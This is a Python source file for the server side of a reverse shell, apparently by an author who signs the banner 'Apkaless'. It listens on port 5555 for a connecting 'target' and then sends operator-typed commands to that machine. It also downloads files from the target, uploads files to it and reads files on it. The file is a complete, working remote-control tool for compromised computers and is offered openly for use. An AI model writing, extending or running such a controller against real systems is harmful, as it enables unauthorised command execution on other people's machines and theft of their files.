import socket
import os


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind(("0.0.0.0", 5555))

server.listen()

print('''

[+]======================================================================[+]

   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx      
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

    _______  _______  _        _______  _        _______  _______  _______ 
   (  ___  )(  ____ )| \    /\(  ___  )( \      (  ____ \(  ____ \(  ____ \'
   | (   ) || (    )||  \  / /| (   ) || (      | (    \/| (    \/| (    \/
   | (___) || (____)||  (_/ / | (___) || |      | (__    | (_____ | (_____ 
   |  ___  ||  _____)|   _ (  |  ___  || |      |  __)   (_____  )(_____  )
   | (   ) || (      |  ( \ \ | (   ) || |      | (            ) |      ) |
   | )   ( || )      |  /  \ \| )   ( || (____/\| (____/\/\____) |/\____) |
   |/     \||/       |_/    \/|/     \|(_______/(_______/\_______)\_______)

   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                                                                                                                                                                   
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

[+]======================================================================[+]

[x] Author  : Apkaless

[x] Country : IRAQ

[+] Server Started !

[+] Waiting For Incoming Connection

''')


while True:

    try:

        object, address = server.accept() # Accept the connection from the target and return the socket object, ipv4 and port number of the target who connected to our server

        print(f'[+] Incoming Connection From {address[0]}:{address[1]}\n') # address[0] is gonna be the target ipv4 and address[1] is gonna be the port number

    except:
        continue

    else:

        while True:

            cmd = input('[Run A Command]: ')

            if cmd =='exit':

                object.send('exit'.encode('ascii'))

                object.close()

                exit()

            elif cmd == '':

                continue

            elif cmd == 'cls':

                os.system('cls')

                continue

            elif cmd == 'download':

                continue

            elif cmd[0:8]=='download':

                object.send(cmd.encode('ascii'))

                data = object.recv(2048).decode('ascii')

                if data == 'File Not Found (ERROR)':

                    print('\n',data,'\n')

                    continue

                else:

                    with open(cmd[9:],'wb') as f:

                        file = f.write(data.encode('ascii'))

                    continue

            elif cmd[0:6]=='upload':

                object.send(cmd.encode('ascii'))

                data = object.recv(2048).decode('ascii')


                if data:

                    try:

                        file = open(cmd[7:], 'rb')

                        file = file.read()

                        object.send(file)

                        continue

                    except FileNotFoundError:

                        print('\nFile Not Found\n')

                        continue

            elif cmd[0:3]=='cat':

                object.send(cmd.encode('ascii'))

                data = object.recv(2048).decode('ascii')

                print('\n',data,'\n')

                continue

            elif cmd == 'cd':
                
                continue

            else:
                
                object.send(cmd.encode('ascii'))

                data = object.recv(2048).decode('ascii')

                print(f"\n{data}\n")